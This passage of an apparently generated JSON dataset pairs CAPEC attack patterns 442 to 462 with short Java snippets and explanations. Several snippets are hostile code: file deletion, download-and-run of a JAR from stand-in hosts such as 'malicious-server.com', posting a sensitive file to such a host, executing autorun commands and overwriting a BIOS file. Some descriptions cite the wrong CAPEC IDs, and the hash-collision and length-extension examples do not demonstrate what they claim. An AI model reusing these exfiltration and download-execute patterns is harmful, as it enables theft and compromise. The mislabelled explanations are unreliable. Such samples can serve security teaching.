        "description": "This Java code snippet demonstrates the concept of 'Malicious Logic Insertion' (CAPEC-284). The main method simulates a benign greeting card application, but it contains hidden malicious logic that is executed when a specific condition is met. The `isMaliciousConditionMet` method always returns true for simplicity, but in a real-world scenario, it could check for more complex conditions. The `executeMaliciousLogic` method simulates a backdoor by attempting to open Notepad, representing improper access control (CWE-284). This snippet embodies the idea of embedding malicious code (CWE-506) that can perform unauthorized actions, potentially replicating itself (CWE-509) or exploiting other weaknesses in the system."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "public class InfectedSoftware {\n    public static void main(String[] args) {\n        System.out.println(\"Running benign functionality...\");\n        // Benign functionality\n        benignFunction();\n        // Malicious code hidden in the software\n        maliciousFunction();\n    }\n\n    private static void benignFunction() {\n        System.out.println(\"This is a benign function.\");\n    }\n\n    private static void maliciousFunction() {\n        // Hidden malicious logic\n        System.out.println(\"Executing hidden malicious code...\");\n        // Example of malicious activity: deleting a file\n        try {\n            java.nio.file.Files.deleteIfExists(java.nio.file.Paths.get(\"/path/to/important/file.txt\"));\n        } catch (java.io.IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The main method runs a benign function that prints a message, simulating normal software behavior. However, it also calls a hidden malicious function that performs a harmful action, such as deleting an important file. This hidden malicious logic represents the CWE-506 (Embedded Malicious Code) and CWE-507 (Trojan Horse) weaknesses. The code is designed to show how malicious logic can be embedded within otherwise benign software, executing harmful actions without the user's knowledge."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/update.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Load the downloaded code (potentially malicious)\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an authorized developer injects malicious logic into a product. The code downloads an executable JAR file from a remote location without performing any integrity checks (CWE-494). This downloaded file could contain malicious code that gets executed, representing the CAPEC of 'Malicious Logic Inserted Into Product by Authorized Developer'. The code snippet highlights the risk of embedded malicious code (CWE-506) and the potential creation of emergent resources (CWE-1229) by executing unverified code. Additionally, it shows a lack of administrator control over security settings (CWE-671) as the administrator cannot prevent or tailor this behavior."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "public class VulnerableApp {\n    private static boolean securityCheck() {\n        // Security-critical code that might be optimized away\n        boolean isSecure = true;\n        // Some security logic\n        return isSecure;\n    }\n\n    public static void main(String[] args) {\n        if (securityCheck()) {\n            // Malicious code inserted during development\n            System.out.println(\"Sensitive data: \" + System.getenv(\"SECRET_KEY\"));\n        } else {\n            System.out.println(\"System is secure.\");\n        }\n    }\n}",
        "description": "This Java code snippet represents a scenario where an adversary has altered the development process to introduce vulnerabilities. The `securityCheck` method contains security-critical code that might be optimized away by the compiler or processor (CWE-733, CWE-1037). The `main` method includes malicious code that exposes sensitive system information (CWE-497) by printing an environment variable `SECRET_KEY` if the security check passes. This demonstrates how an attacker can embed malicious code (CWE-506) and improperly control dynamically-managed code resources (CWE-913) during the development phase, leading to a negative impact when the system is deployed."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious-server.com/update.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where malicious logic is inserted into a software product via configuration management manipulation. The code downloads an update from a remote server without performing any integrity checks (CWE-494). After downloading, it executes the downloaded JAR file, which could contain malicious code (CWE-829). This represents the main idea of the CAPEC, where an adversary can manipulate the configuration management system to insert malicious logic into a software product."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "import java.util.*;\nimport java.io.*;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        try {\n            // CWE-1395: Dependency on Vulnerable Third-Party Component\n            // CWE-1357: Reliance on Insufficiently Trustworthy Component\n            FileInputStream fis = new FileInputStream(\"untrusted-component.jar\");\n            byte[] data = new byte[fis.available()];\n            fis.read(data);\n            fis.close();\n            // CWE-506: Embedded Malicious Code\n            // Dynamically load the untrusted component\n            ClassLoader classLoader = new URLClassLoader(new URL[]{new URL(\"file:untrusted-component.jar\")});\n            Class<?> clazz = classLoader.loadClass(\"com.untrusted.Component\");\n            Object instance = clazz.getDeclaredConstructor().newInstance();\n            clazz.getMethod(\"execute\").invoke(instance);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that includes and executes a third-party component from an untrusted source. The code reads a JAR file ('untrusted-component.jar') and dynamically loads a class ('com.untrusted.Component') from it. This class is then instantiated and its 'execute' method is invoked. This example embodies the CAPEC concept of 'Malicious Logic Insertion into Product via Inclusion of Third-Party Component' by showing how an application can be compromised through the inclusion of an insecure or malicious third-party component. The related CWEs are represented as follows: CWE-829 (inclusion of functionality from an untrusted control sphere), CWE-1395 (dependency on a vulnerable third-party component), CWE-1357 (reliance on an insufficiently trustworthy component), and CWE-506 (embedded malicious code)."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "public class SecureSystem {\n    private boolean isAuthenticated = false;\n    private String sensitiveData = \"Sensitive Information\";\n\n    // Security-critical method that should not be optimized away\n    private void authenticate() {\n        // Simulate authentication logic\n        isAuthenticated = true;\n    }\n\n    // Method to access sensitive data\n    public String getSensitiveData() {\n        // Client-side enforcement of server-side security\n        if (!isAuthenticated) {\n            authenticate(); // This could be optimized away by the compiler\n        }\n        return sensitiveData;\n    }\n\n    public static void main(String[] args) {\n        SecureSystem system = new SecureSystem();\n        // Attempt to access sensitive data without proper authentication\n        System.out.println(system.getSensitiveData());\n    }\n}",
        "description": "This Java code snippet represents a design alteration attack by demonstrating a violation of secure design principles (CWE-657) and potential issues with compiler optimization (CWE-733). The `authenticate` method is intended to be a security-critical mechanism to ensure that the user is authenticated before accessing sensitive data. However, the authentication logic is weak and could be optimized away by the compiler, leading to unauthorized access to sensitive information (CWE-497). Additionally, the code relies on client-side enforcement of server-side security (CWE-602), which is a flawed design approach. This snippet embodies the main idea of CAPEC-1037 by showing how a design alteration can introduce vulnerabilities that can be exploited once the system is deployed."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class MaliciousDLL {\n    public static void main(String[] args) {\n        try {\n            // Untrusted search path vulnerability (CWE-426)\n            String dllPath = args[0];\n            Path path = Paths.get(dllPath);\n            byte[] dllBytes = Files.readAllBytes(path);\n\n            // Embed malicious code (CWE-506)\n            byte[] maliciousCode = new byte[]{(byte) 0x90, (byte) 0x90, (byte) 0x90}; // NOP sled as placeholder\n            int insertPosition = findInsertPosition(dllBytes);\n            System.arraycopy(maliciousCode, 0, dllBytes, insertPosition, maliciousCode.length);\n\n            // Write the tampered DLL back to disk\n            Files.write(path, dllBytes);\n\n            // Replicating malicious code (CWE-509)\n            replicateMaliciousCode(dllPath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static int findInsertPosition(byte[] dllBytes) {\n        // Simplified logic to find a position to insert malicious code\n        return dllBytes.length / 2;\n    }\n\n    private static void replicateMaliciousCode(String dllPath) {\n        // Simplified replication logic\n        try {\n            Path targetPath = Paths.get(dllPath + \".infected\");\n            Files.copy(Paths.get(dllPath), targetPath, StandardCopyOption.REPLACE_EXISTING);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of embedding a virus into a DLL, as described in the CAPEC. The code reads a DLL file from an untrusted search path (CWE-426), inserts a placeholder for malicious code (CWE-506), and writes the tampered DLL back to disk. Additionally, it includes a simplified replication mechanism to copy the infected DLL to a new location (CWE-509). The code highlights the vulnerabilities and potential malicious actions that can be taken by exploiting these weaknesses."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class MaliciousUSB {\n    public static void main(String[] args) {\n        // CWE-67: Improper Handling of Windows Device Names\n        String maliciousPath = \"C:\\\\AUX\\\\malicious.txt\";\n        try {\n            // CWE-506: Embedded Malicious Code\n            File file = new File(maliciousPath);\n            if (file.createNewFile()) {\n                FileWriter writer = new FileWriter(file);\n                // CWE-507: Trojan Horse\n                writer.write(\"This is a malicious file.\");\n                writer.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of malware propagation via a USB stick, embodying the main idea of the deprecated CAPEC. The code creates a file with a Windows device name (CWE-67), which can lead to denial of service or information exposure. It then writes malicious content to the file (CWE-506 and CWE-507), representing embedded malicious code and a Trojan horse. This snippet highlights how an attacker might exploit these weaknesses to propagate malware."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "import java.io.*;\n\npublic class MaliciousUSB {\n    public static void main(String[] args) {\n        String usbPath = \"E:\\\\autorun.inf\";\n        try {\n            // Check if the USB drive contains the autorun.inf file\n            File autorunFile = new File(usbPath);\n            if (autorunFile.exists()) {\n                // Read the autorun.inf file\n                BufferedReader br = new BufferedReader(new FileReader(autorunFile));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    // Simulate execution of commands in autorun.inf\n                    if (line.contains(\"open\")) {\n                        String maliciousCommand = line.split(\"=\")[1];\n                        Runtime.getRuntime().exec(maliciousCommand);\n                    }\n                }\n                br.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of malware propagation via a USB drive's autorun feature. The code checks for the presence of an 'autorun.inf' file on a USB drive (simulated by the path 'E:\\autorun.inf'). If the file exists, it reads the file line by line, looking for commands to execute. If a line contains the 'open' command, it extracts and executes the associated command using 'Runtime.getRuntime().exec()'. This represents the CAPEC-448 attack pattern, where malicious code is embedded in a DLL or similar file to propagate malware. The code also touches on related CWEs, such as CWE-507 (Trojan Horse) by hiding malicious functionality within seemingly benign code, and CWE-509 (Replicating Malicious Code) by potentially executing commands that could replicate the malware."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class MalwarePropagation {\n    public static void main(String[] args) {\n        try {\n            // Simulate copying a file from an infected USB device\n            File sourceFile = new File(\"/media/usb/infectedFile.exe\");\n            File destFile = new File(\"/home/user/infectedFile.exe\");\n            copyFile(sourceFile, destFile);\n\n            // Simulate executing the copied file\n            Runtime.getRuntime().exec(destFile.getAbsolutePath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void copyFile(File source, File dest) throws IOException {\n        try (FileInputStream fis = new FileInputStream(source);\n             FileOutputStream fos = new FileOutputStream(dest)) {\n            byte[] buffer = new byte[1024];\n            int length;\n            while ((length = fis.read(buffer)) > 0) {\n                fos.write(buffer, 0, length);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of malware propagation via an infected peripheral device, such as a USB drive. The code copies a file from a USB device to the user's home directory and then executes it. This represents the main idea of CAPEC-448, where malware spreads through infected peripheral devices. The code also touches on CWE-507 (Trojan Horse) as the copied file could contain hidden malicious code. Additionally, it indirectly relates to CWE-1277 (Firmware Not Updateable) as the inability to update firmware could prevent the detection and mitigation of such malware. The code is vulnerable because it blindly copies and executes a file without any security checks, which could lead to severe security breaches."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "public class InfectedHardware {\n    private static boolean debugMode = false;\n    private static int[] memoryMappedRegisters = new int[10];\n\n    public static void main(String[] args) {\n        // Simulate normal operation\n        performNormalOperation();\n\n        // Malicious logic hidden from the user\n        if (debugMode) {\n            activateMaliciousLogic();\n        }\n    }\n\n    private static void performNormalOperation() {\n        // Normal hardware operation code\n        System.out.println(\"Performing normal operations...\");\n    }\n\n    private static void activateMaliciousLogic() {\n        // Malicious code that manipulates hardware registers\n        for (int i = 0; i < memoryMappedRegisters.length; i++) {\n            memoryMappedRegisters[i] = 0xDEADBEEF; // Arbitrary malicious value\n        }\n        System.out.println(\"Malicious logic activated!\");\n    }\n\n    // Simulate improper access control to register interface\n    public static void writeToRegister(int index, int value) {\n        if (index >= 0 && index < memoryMappedRegisters.length) {\n            memoryMappedRegisters[index] = value;\n        }\n    }\n\n    // Simulate activation of debug mode at runtime\n    public static void enableDebugMode() {\n        debugMode = true;\n    }\n}",
        "description": "This Java code snippet simulates the concept of 'Infected Hardware' by incorporating malicious logic that can be activated during runtime. The `debugMode` flag represents a hidden feature that, when enabled, triggers the `activateMaliciousLogic` method. This method manipulates memory-mapped registers, simulating the insertion of malicious code (CWE-506, CWE-509). The `writeToRegister` method demonstrates improper access control to hardware registers (CWE-1262), and the `enableDebugMode` method shows how debug logic can be activated at runtime (CWE-1313). The code embodies the idea of an adversary inserting and activating malicious logic in hardware that is already in operation."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class MaliciousHardwareSimulation {\n    private static Map<String, String> storedData = new HashMap<>();\n    private static boolean isAuthenticated = false;\n\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            handleClient(clientSocket);\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) throws IOException {\n        // Simulate capture-replay attack\n        if (isAuthenticated) {\n            System.out.println(\"Authentication bypassed via replay attack.\");\n            modifyStoredData(\"key\", \"malicious_value\");\n        } else {\n            // Simulate authentication process\n            isAuthenticated = true;\n            System.out.println(\"Client authenticated.\");\n        }\n    }\n\n    private static void modifyStoredData(String key, String value) {\n        // Simulate embedded malicious code\n        storedData.put(key, value);\n        System.out.println(\"Stored data modified: \" + key + \" = \" + value);\n    }\n}",
        "description": "This Java code snippet simulates a scenario where malicious logic is inserted into hardware, embodying the main idea of CAPEC-452. The code sets up a simple server that accepts client connections. It demonstrates a capture-replay attack (CWE-294) by bypassing authentication after the first successful authentication. Once authenticated, it modifies stored data (CWE-506) to simulate embedded malicious code. This represents how counterfeit hardware could be used to inject malicious logic into a system, compromising its integrity and security."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "public class HardwareComponent {\n    private boolean isMalicious = false;\n    private String firmwareVersion = \"1.0.0\";\n    private String undocumentedFeature = \"\";\n\n    public void updateFirmware(String newFirmware) {\n        if (newFirmware.contains(\"malicious\")) {\n            isMalicious = true;\n        }\n        firmwareVersion = newFirmware;\n    }\n\n    public void enableUndocumentedFeature() {\n        undocumentedFeature = \"backdoor_access\";\n    }\n\n    public boolean isMalicious() {\n        return isMalicious;\n    }\n\n    public String getFirmwareVersion() {\n        return firmwareVersion;\n    }\n\n    public String getUndocumentedFeature() {\n        return undocumentedFeature;\n    }\n}",
        "description": "This Java code snippet represents a hardware component that can be compromised by malicious firmware updates and includes undocumented features. The `updateFirmware` method simulates the insertion of malicious logic into the hardware by checking if the new firmware contains the string 'malicious'. If it does, the `isMalicious` flag is set to true. The `enableUndocumentedFeature` method simulates the inclusion of undocumented features or 'chicken bits' by setting an undocumented feature to 'backdoor_access'. This code embodies the main idea of CAPEC-452 by demonstrating how malicious logic can be inserted into product hardware and highlights related weaknesses such as embedded malicious code (CWE-506) and the inclusion of undocumented features (CWE-1242)."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "public class MaliciousHardwareComponent {\n    private boolean isMalicious;\n    private String storedData;\n\n    public MaliciousHardwareComponent(boolean isMalicious) {\n        this.isMalicious = isMalicious;\n        this.storedData = \"Sensitive Data\";\n    }\n\n    public void modifyStoredData() {\n        if (isMalicious) {\n            storedData = \"Modified Data\"; // CWE-506: Embedded Malicious Code\n        }\n    }\n\n    public String getStoredData() {\n        return storedData;\n    }\n\n    public static void main(String[] args) {\n        MaliciousHardwareComponent component = new MaliciousHardwareComponent(true);\n        component.modifyStoredData();\n        System.out.println(\"Stored Data: \" + component.getStoredData());\n    }\n}",
        "description": "This Java code snippet represents a malicious hardware component that can modify stored data, embodying the main idea of CAPEC-457. The class `MaliciousHardwareComponent` has a boolean flag `isMalicious` to indicate if the component is malicious. If it is, the `modifyStoredData` method changes the stored data, demonstrating CWE-506 (Embedded Malicious Code). The `main` method creates an instance of this component, modifies the stored data if the component is malicious, and prints the modified data. This snippet illustrates how a counterfeit hardware component can introduce malicious logic to alter stored data, reflecting the deprecated CAPEC and related CWEs."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "public class InfectedMemoryExample {\n    private static final int PROTECTED_MEMORY_START = 0x1000;\n    private static final int PROTECTED_MEMORY_END = 0x1FFF;\n    private static final int MIRRORED_MEMORY_START = 0x2000;\n    private static final int MIRRORED_MEMORY_END = 0x2FFF;\n\n    private static byte[] memory = new byte[0x3000];\n\n    public static void main(String[] args) {\n        // Simulate secure boot process\n        secureBoot();\n\n        // Malicious code injection into mirrored memory\n        injectMaliciousCode(MIRRORED_MEMORY_START);\n\n        // Accessing protected memory through mirrored region\n        byte data = readMemory(MIRRORED_MEMORY_START);\n        System.out.println(\"Data from mirrored memory: \" + data);\n    }\n\n    private static void secureBoot() {\n        // Load bootloader code into protected memory\n        for (int i = PROTECTED_MEMORY_START; i <= PROTECTED_MEMORY_END; i++) {\n            memory[i] = (byte) (i & 0xFF); // Dummy bootloader code\n        }\n    }\n\n    private static void injectMaliciousCode(int address) {\n        if (address >= MIRRORED_MEMORY_START && address <= MIRRORED_MEMORY_END) {\n            memory[address] = (byte) 0xDE; // Malicious code\n        }\n    }\n\n    private static byte readMemory(int address) {\n        if (address >= PROTECTED_MEMORY_START && address <= PROTECTED_MEMORY_END) {\n            throw new SecurityException(\"Access to protected memory is denied!\");\n        }\n        return memory[address];\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can inject malicious code into a mirrored memory region, bypassing the intended access controls. The `secureBoot` method simulates the secure boot process by loading bootloader code into a protected memory region. The `injectMaliciousCode` method allows an attacker to insert malicious code into a mirrored memory region, which is not adequately protected. The `readMemory` method attempts to enforce access control but fails to account for the mirrored memory region, allowing the malicious code to be executed. This example embodies the main idea of the CAPEC 'Infected Memory' and highlights related CWEs such as improper access control for mirrored memory regions and overlapping protected and unprotected memory ranges."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class USBMalware {\n    public static void main(String[] args) {\n        try {\n            // Simulate reading sensitive data from the system\n            File sensitiveFile = new File(\"/path/to/sensitive/data.txt\");\n            FileInputStream fis = new FileInputStream(sensitiveFile);\n            byte[] data = new byte[(int) sensitiveFile.length()];\n            fis.read(data);\n            fis.close();\n\n            // Transmit sensitive data in cleartext\n            URL url = new URL(\"http://malicious-server.com/upload\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setDoOutput(true);\n            conn.setRequestMethod(\"POST\");\n            FileOutputStream fos = new FileOutputStream(conn.getOutputStream());\n            fos.write(data);\n            fos.close();\n\n            // Simulate malicious code execution\n            Runtime.getRuntime().exec(\"cmd /c start notepad.exe\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet simulates a USB malware attack. It reads sensitive data from a file on the system, transmits this data in cleartext to a remote server, and executes a malicious command. The code embodies the main idea of the CAPEC 'USB Memory Attacks' by demonstrating how an adversary can use a USB device to exfiltrate sensitive information and execute malicious actions. The related CWEs are represented as follows: CWE-1299 (Missing Protection Mechanism for Alternate Hardware Interface) is implied by the lack of security checks before accessing the file, CWE-319 (Cleartext Transmission of Sensitive Information) is shown by transmitting data in cleartext, and CWE-506 (Embedded Malicious Code) is represented by the execution of a malicious command."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class FlashMemoryAttack {\n    private static final String BIOS_FILE_PATH = \"/path/to/bios.bin\";\n    private static final byte[] MALICIOUS_CODE = {0x00, 0x01, 0x02, 0x03}; // Example malicious code\n\n    public static void main(String[] args) {\n        try {\n            flashMaliciousBIOS();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void flashMaliciousBIOS() throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(BIOS_FILE_PATH)) {\n            fos.write(MALICIOUS_CODE);\n            System.out.println(\"BIOS flashed with malicious code.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a flash memory attack, where malicious code is written to a BIOS file. The `flashMaliciousBIOS` method opens a file output stream to the BIOS file path and writes a byte array representing malicious code to it. This embodies the main idea of CAPEC-Flash Memory Attacks, where an adversary inserts malicious logic into a product by flashing the on-board memory. The code also touches on CWE-1282 (Assumed-Immutable Data is Stored in Writable Memory) by showing how supposedly immutable BIOS data can be overwritten, and CWE-506 (Embedded Malicious Code) by embedding malicious code into the BIOS."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.cert.CertificateException;\nimport java.security.cert.CertificateFactory;\nimport java.security.cert.X509Certificate;\nimport java.util.Base64;\n\npublic class RogueCertificateExample {\n    public static void main(String[] args) throws CertificateException, NoSuchAlgorithmException {\n        // Simulate a weak hashing algorithm (e.g., MD5)\n        String weakHashAlgorithm = \"MD5\";\n        MessageDigest md = MessageDigest.getInstance(weakHashAlgorithm);\n\n        // Original certificate data (CSR)\n        String originalCSR = \"Original Certificate Signing Request\";\n        byte[] originalHash = md.digest(originalCSR.getBytes());\n\n        // Malicious certificate data (CSR with collision block)\n        String maliciousCSR = \"Malicious Certificate Signing Request\";\n        byte[] maliciousHash = md.digest(maliciousCSR.getBytes());\n\n        // Check if hashes collide (they shouldn't, but due to weak algorithm, they might)\n        if (MessageDigest.isEqual(originalHash, maliciousHash)) {\n            System.out.println(\"Hash collision detected! Malicious certificate can be signed.\");\n\n            // Simulate signing the malicious certificate\n            String signedMaliciousCertificate = Base64.getEncoder().encodeToString(maliciousCSR.getBytes());\n\n            // Simulate validation of the signed certificate\n            CertificateFactory certFactory = CertificateFactory.getInstance(\"X.509\");\n            X509Certificate cert = (X509Certificate) certFactory.generateCertificate(\n                    new java.io.ByteArrayInputStream(Base64.getDecoder().decode(signedMaliciousCertificate)));\n\n            // Improper validation: assuming the certificate is valid without proper checks\n            System.out.println(\"Certificate signed and validated: \" + cert.toString());\n        } else {\n            System.out.println(\"No hash collision. Certificate is safe.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of creating a rogue certification authority certificate by exploiting a weak hashing algorithm (MD5 in this case). The code simulates the generation of two certificate signing requests (CSRs): one original and one malicious. It then checks if the hashes of these CSRs collide due to the weak hashing algorithm. If a collision is detected, it simulates signing the malicious certificate and improperly validates it without proper checks. This represents the vulnerability where an adversary can create a rogue certificate that appears to be signed by a trusted certificate authority due to hash collisions, highlighting the risks associated with using broken or risky cryptographic algorithms and improper certificate validation."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userId = request.getParameter(\"userId\");\n        String action = request.getParameter(\"action\");\n        \n        // Potentially vulnerable code: concatenating parameters directly into a command\n        String command = \"processUser?userId=\" + userId + \"&action=\" + action;\n        \n        // Simulate processing the command\n        response.getWriter().println(\"Executing command: \" + command);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a potential HTTP Parameter Pollution (HPP) vulnerability. The servlet processes HTTP GET requests and retrieves 'userId' and 'action' parameters from the query string. It then constructs a command string by directly concatenating these parameters. This approach is vulnerable to HPP attacks, where an attacker can inject additional parameters or delimiters to manipulate the command. For example, an attacker could send a request like '/vulnerableServlet?userId=123&action=delete&userId=456', potentially causing unexpected behavior. This code also touches on related CWEs, such as improper handling of extra parameters (CWE-235) and improper neutralization of input terminators (CWE-147)."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Arrays;\n\npublic class WebServiceAPI {\n    private static final String SECRET_TOKEN = \"secret\";\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String userInput = \"user=data&timestamp=123456\";\n        String signature = generateSignature(userInput);\n        System.out.println(\"Generated Signature: \" + signature);\n\n        // Vulnerable to hash extension attack\n        String forgedInput = \"user=attacker&timestamp=123456\";\n        String forgedSignature = generateSignature(forgedInput);\n        System.out.println(\"Forged Signature: \" + forgedSignature);\n    }\n\n    private static String generateSignature(String data) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-328: Use of Weak Hash\n        md.update((data + SECRET_TOKEN).getBytes());\n        byte[] digest = md.digest();\n        return bytesToHex(digest);\n    }\n\n    private static String bytesToHex(byte[] bytes) {\n        StringBuilder sb = new StringBuilder();\n        for (byte b : bytes) {\n            sb.append(String.format(\"%02x\", b));\n        }\n        return sb.toString();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a web service API signature generation mechanism. The `generateSignature` method uses the MD5 hash function (CWE-328: Use of Weak Hash) to create a signature by concatenating user input with a secret token. The main method shows how an attacker can forge a signature by modifying the input parameters, exploiting the hash function extension weakness described in the CAPEC. This vulnerability can lead to authentication bypass (CWE-290, CWE-305) and weak authentication (CWE-1390). The code highlights the risk of using weak hash functions and improper handling of input data in authentication mechanisms."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class CrossDomainTimingAttack {\n    public static void main(String[] args) throws IOException {\n        String targetUrl = \"http://example.com/sensitiveEndpoint\";\n        long startTime = System.currentTimeMillis();\n        sendGetRequest(targetUrl);\n        long endTime = System.currentTimeMillis();\n        System.out.println(\"Response time: \" + (endTime - startTime) + \" ms\");\n    }\n\n    private static void sendGetRequest(String targetUrl) throws IOException {\n        URL url = new URL(targetUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n        int responseCode = connection.getResponseCode();\n        System.out.println(\"Response Code: \" + responseCode);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a cross-domain search timing attack. The code sends an HTTP GET request to a target URL and measures the time taken for the server to respond. The response time is then printed to the console. This timing information can potentially reveal sensitive information about the server's state or the presence of certain data, even though the attacker cannot directly read the server's response due to the same-origin policy. This example embodies the main idea of CAPEC-233 (Cross-Domain Search Timing) and is related to CWE-385 (Covert Timing Channel) and CWE-208 (Observable Timing Discrepancy)."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
